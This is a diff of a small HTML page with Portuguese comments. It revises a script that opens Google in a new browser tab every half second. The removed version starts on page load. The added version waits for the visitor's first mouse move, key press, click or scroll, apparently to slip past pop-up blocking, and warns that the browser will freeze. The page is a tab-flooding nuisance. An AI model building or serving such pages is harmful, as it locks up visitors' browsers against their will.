@@ -2,30 +2,55 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Loop Google (Auto Start)</title>
-  <script>
-    // Função para abrir o loop
-    function startPopUpLoop() {
-      let childWindow = window.open("https://www.google.com/", "_blank");
+  <title>Loop em Qualquer Ação</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding-top: 20%;
+      background-color: #222;
+      color: #f0f0f0;
+      user-select: none;
+    }
+    #status {
+      font-size: 24px;
+      color: #ff4141;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
 
-      setInterval(() => {
-        // Tenta usar a janela filha para abrir a próxima
-        if (childWindow && !childWindow.closed) {
-          childWindow.open("https://www.google.com/", "_blank");
-        } else {
-          // Se a janela filha for fechada, tenta abrir uma nova do pai
-          childWindow = window.open("https://www.google.com/", "_blank");
-        }
+  <h1>LOOP AUTOMÁTICO</h1>
+  <p id="status">Mova o mouse ou pressione qualquer tecla para iniciar.</p>
+
+  <script>
+    let intervalId; // Variável para armazenar o ID do intervalo
+
+    // Função que inicia o loop de abrir abas
+    function startLoop() {
+      // Atualiza o status na tela
+      document.getElementById('status').innerText = "LOOP INICIADO! SEU NAVEGADOR VAI TRAVAR EM BREVE.";
+
+      // Remove todos os event listeners para evitar que o loop seja reiniciado
+      document.body.removeEventListener('mousemove', startLoop);
+      document.body.removeEventListener('keydown', startLoop);
+      document.body.removeEventListener('click', startLoop);
+      document.body.removeEventListener('wheel', startLoop);
+
+      // Inicia o intervalo que abre uma nova aba a cada 500 milissegundos
+      intervalId = setInterval(() => {
+        window.open("https://www.google.com/", "_blank");
       }, 500);
     }
 
-    // Inicia a função assim que a página carregar
-    window.onload = startPopUpLoop;
+    // Adiciona os event listeners para iniciar o loop na primeira interação
+    document.body.addEventListener('mousemove', startLoop, { once: true });
+    document.body.addEventListener('keydown', startLoop, { once: true });
+    document.body.addEventListener('click', startLoop, { once: true });
+    document.body.addEventListener('wheel', startLoop, { once: true });
 
   </script>
-</head>
-<body>
-  <h1>Abrindo Google em loop...</h1>
-  <p>Se você está vendo esta mensagem, o bloqueador de pop-ups do seu navegador pode ter impedido o script.</p>
+
 </body>
 </html>
